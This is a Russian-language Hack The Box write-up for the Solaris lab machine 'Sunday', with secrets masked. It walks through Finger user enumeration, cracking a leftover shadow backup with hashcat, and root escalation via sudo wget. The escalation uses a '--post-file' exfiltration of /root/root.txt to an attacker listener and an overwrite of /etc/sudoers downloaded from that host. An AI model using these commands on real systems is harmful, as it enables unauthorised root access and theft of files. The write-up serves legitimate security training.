# Sunday (HTB)

> Платформа: Hack The Box  
> ОС: Solaris  
> Сложность: Легко  
> Результат: root

---

## Цепочка Атаки

```text
Reconnaissance
├── nmap -sC -sV -p- sunday.htb → 79 (Finger), 22022 (SSH OpenSSH 8.4)
└── Платформа Solaris

Enumeration (Finger)
├── msfconsole → scanner/finger/finger_users
└── ./finger-user-enum.pl -u root -t <target>
    └── Ответ: root ... <PASSWORD> (Office Location = пароль-подсказка)

Foothold (SSH)
├── ssh -p 22022 sunny@sunday.htb → password: <PASSWORD>
└── sudo -l → (root) NOPASSWD: /root/troll - ЛОВУШКА

Lateral Movement (Backup)
├── cd /backup → agent22.backup, shadow.backup
├── sammy:<SHA256_HASH>
├── sunny:<SHA256_HASH>
└── hashcat -m 7400 → sammy:<PASSWORD>

User Flag
├── ssh -p 22022 sammy@sunday.htb (<PASSWORD>)
└── cat user.txt → <USER_FLAG>

Privilege Escalation (sudo wget)
├── sudo -l → (root) NOPASSWD: /usr/bin/wget
├── Exfil: sudo wget --post-file=/root/root.txt http://10.10.14.160:8000/
├── nc -lvnp 8000 → root flag (<ROOT_FLAG>)
├── Подмена /etc/sudoers:
│   ├── echo "sammy ALL=(ALL) NOPASSWD: ALL" > sudoers
│   └── sudo wget -O /etc/sudoers http://10.10.14.160:8000/sudoers
└── sudo su → root
```

> [!NOTE]
> Все флаги, пароли, хеши и токены сессий были замаскированы по этическим соображениям.

---

## Брифинг Машины

Solaris с Finger-сервисом на порту 79 и SSH на нестандартном порту 22022. В `/backup/` оставлена резервная копия `/etc/shadow`.

---

## Разведка

### Port Scan

```bash
sudo nmap -sC -sV -p- sunday.htb
```

| Порт  | Сервис | Версия         |
|-------|--------|----------------|
| 79    | Finger | Finger service |
| 22022 | SSH    | OpenSSH 8.4    |

Платформа - Solaris.

---

## Перечисление (Finger)

```bash
msfconsole
use scanner/finger/finger_users
set RHOST 10.129.77.192
run
```

Найдены пользователи: `root`, `sammy`, `sunny`, `adm`, `bin`, `daemon`, `sshd`, `openldap`.

```bash
./finger-user-enum.pl -u root -t 10.129.77.192
```

```
root@10.129.77.192: root     Super-User     pts/3     <Apr 24 10:37>     <PASSWORD>
```

Поле Office Location содержит `<PASSWORD>` - подсказка администратора.

---

## Первичный Доступ

```bash
ssh -p 22022 sunny@sunday.htb
# Password: <PASSWORD>

sudo -l
# User sunny may run the following commands on sunday:
#     (root) NOPASSWD: /root/troll

sudo /root/troll
# testing
# uid=0(root) gid=0(root)
```

Скрипт только печатает `id`. Root shell не даёт.

---

## Боковое Перемещение (Backup)

```bash
cd /backup
ls
# agent22.backup  shadow.backup

cat shadow.backup
```

```
sammy:<SHA256_HASH>:6445::::::
sunny:<SHA256_HASH>:17636::::::
```

Формат `$5$` - SHA-256 crypt, hashcat mode **7400**.

```bash
echo '<SHA256_HASH>' > hashes.txt
hashcat -m 7400 hashes.txt /usr/share/wordlists/rockyou.txt
# <PASSWORD>
```

**Важный нюанс:** только хеш, без `username:`.

```bash
ssh -p 22022 sammy@sunday.htb
# Password: <PASSWORD>
cat user.txt
# <USER_FLAG>
```

---

## Повышение Привилегий

```bash
sudo -l
# User sammy may run the following commands on sunday:
#     (root) NOPASSWD: /usr/bin/wget
```

### Exfil root.txt

```bash
nc -lvnp 8000
sudo wget --post-file=/root/root.txt http://10.10.14.160:8000/
# <ROOT_FLAG>
```

### Полноценный root - подмена /etc/sudoers

```bash
# Kali
echo "sammy ALL=(ALL) NOPASSWD: ALL" > sudoers
python3 -m http.server 8000

# target
sudo wget -O /etc/sudoers http://10.10.14.160:8000/sudoers
sudo su
whoami
# root
cat /root/root.txt
# <ROOT_FLAG>
```

---

## Флаги

| Флаг | Значение                         |
|------|----------------------------------|
| User | <USER_FLAG> |
| Root | <ROOT_FLAG> |

---

## Ключевые Выводы

- **Finger (79) - недооценённый сервис.** Не только список пользователей, но и подсказки в полях типа Office Location.
- **Нестандартные порты** - обязательно `-p-`, SSH на 22022 легко пропустить.
- **Ловушки (`troll`)** - не каждый `sudo -l` результат ведёт к реальному root.
- **Забытые backup-файлы** - `/backup/shadow.backup` даёт хеши.
- **GTFOBins для wget** - `--post-file` для эксфильтрации, `-O` для подмены системных файлов.
- **Форматирование hash-файлов** - только хеш, без метаданных.
